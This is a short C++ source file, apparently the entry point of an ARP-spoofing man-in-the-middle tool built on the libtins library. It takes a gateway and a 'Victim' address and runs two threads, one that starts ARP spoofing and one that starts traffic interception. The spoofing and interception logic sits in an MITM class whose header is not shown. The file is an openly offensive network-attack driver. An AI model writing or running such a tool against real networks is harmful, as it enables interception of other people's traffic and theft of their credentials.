#include <iostream>
#include <tins/tins.h>
#include <string>
#include <thread>
#include <chrono>
#include "MITM.h"

using namespace std;
using namespace Tins;

int main(int argc, char *argv[]) {
    if(argc != 3) {
        fprintf(stderr, "[*] Usage : %s [Gateway] [Victim]\n", argv[0]);
        return 1;
    }

    MITM mitm(argv[1], argv[2]);
    thread t(&MITM::startARPSpoofing, &mitm);
    thread t2(&MITM::startMITM, &mitm);
    t.join();
    t2.join();

    return 0;
}